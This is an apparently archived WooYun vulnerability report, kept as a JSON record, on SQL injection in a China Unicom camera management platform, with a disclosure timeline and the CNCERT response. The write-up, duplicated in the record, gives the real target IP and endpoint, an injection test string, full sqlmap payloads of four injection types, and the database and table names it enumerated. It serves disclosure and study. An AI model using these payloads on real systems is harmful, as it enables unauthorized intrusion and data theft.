{"id": 2025, "wybug_id": "wooyun-2015-0121611", "wybug_title": "中国联通某摄像管理平台存在SQL注入漏洞", "wybug_corp": "中国联通", "wybug_author": "浮萍", "wybug_date": "2015-07-06 17:01", "wybug_open_date": "2015-08-24 13:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向公众公开  简要描述： SQL注入 详细说明：  偶然看见一个洞就有蓝v的白帽子“我是壮丁” http://www.wooyun.org/whitehats/我是壮丁就去看看他发的漏洞 WooYun: 中国联通某摄像管理平台存在弱口令+sql注入 然后也发现了一个SQL注入地址http://210.22.8.98/login.action注册一个账号在用户设置页面添加授权管理人员http://210.22.8.98/user/settingUser.action已知admin用户存在添加admin\n\n提示正常添加admin'\n\n疑似有问题添加admin'or'1'='1\n\n提示正常然后抓包\nhttp://210.22.8.98/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=%2Fuser%2FsettingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string%3Aadmin'or'1'%253D'1&batchId=2&locale=zh_CN\n需要带cookie\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 67 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=-7303' OR (9955=9955)#&batchId=2&locale=zh_CN    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string:' AND (SELECT 8433 FROM(SELECT COUNT(*),CONCAT(0x71786c6971,(SELECT (CASE WHEN (8433=8433) THEN 1 ELSE 0 END)),0x71707a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Nimd'='Nimd&batchId=2&locale=zh_CN    Type: UNION query    Title: MySQL UNION query (NULL) - 3 columns    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string:' UNION ALL SELECT CONCAT(0x71786c6971,0x66616a73435941424854,0x71707a7071),NULL,NULL#&batchId=2&locale=zh_CN    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string:' AND 7962=BENCHMARK(5000000,MD5(0x424f5269)) AND 'hHRS'='hHRS&batchId=2&locale=zh_CN---[14:38:29] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.0.64back-end DBMS: MySQL 5.0\n数据库\navailable databases [5]:[*] db_register[*] dserver_1[*] information_schema[*] mysql[*] test\n当前库current database:    'db_register'其中的表\nDatabase: db_register[17 tables]+---------------------+| admin               || admin_camera_group  || admin_manage_camera || appointuser         || appserver           || appserverassign     || appserverinfo       || db_version          || devices             || dserver_names       || dservers            || groups              || languages           || location            || location_names      || news                || users               |+---------------------+\n看看users中的数据条数\n\n   漏洞证明：  添加admin\n\n提示正常添加admin'\n\n疑似有问题添加admin'or'1'='1\n\n提示正常然后抓包\nhttp://210.22.8.98/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=%2Fuser%2FsettingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string%3Aadmin'or'1'%253D'1&batchId=2&locale=zh_CN\n需要带cookie\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 67 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=-7303' OR (9955=9955)#&batchId=2&locale=zh_CN    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string:' AND (SELECT 8433 FROM(SELECT COUNT(*),CONCAT(0x71786c6971,(SELECT (CASE WHEN (8433=8433) THEN 1 ELSE 0 END)),0x71707a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Nimd'='Nimd&batchId=2&locale=zh_CN    Type: UNION query    Title: MySQL UNION query (NULL) - 3 columns    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string:' UNION ALL SELECT CONCAT(0x71786c6971,0x66616a73435941424854,0x71707a7071),NULL,NULL#&batchId=2&locale=zh_CN    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: http://210.22.8.98:80/dwr/call/plaincall/DwrUserInfo.validateAppointUser.dwr?callCount=1&page=/user/settingUser.action&httpSessionId=&scriptSessionId=1434695608453&c0-scriptName=DwrUserInfo&c0-methodName=validateAppointUser&c0-id=0&c0-param0=string:' AND 7962=BENCHMARK(5000000,MD5(0x424f5269)) AND 'hHRS'='hHRS&batchId=2&locale=zh_CN---[14:38:29] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.0.64back-end DBMS: MySQL 5.0\n数据库\navailable databases [5]:[*] db_register[*] dserver_1[*] information_schema[*] mysql[*] test\n当前库current database:    'db_register'其中的表\nDatabase: db_register[17 tables]+---------------------+| admin               || admin_camera_group  || admin_manage_camera || appointuser         || appserver           || appserverassign     || appserverinfo       || db_version          || devices             || dserver_names       || dservers            || groups              || languages           || location            || location_names      || news                || users               |+---------------------+\n看看users中的数据条数\n\n   修复方案：  别的地方都过滤了这个地方漏了嘛通用让我找案例，那就不走通用了   版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-07-10 13:02 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国联通集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-07 12:53 |    \t\t我是壮丁  \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专业打酱油)\t\t \n  可以多看看我发的文章    \n     2015-09-07 12:54 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  @我是壮丁 搞基,没人是你的对手。    \n     2015-09-07 15:26 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @我是壮丁 收到    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}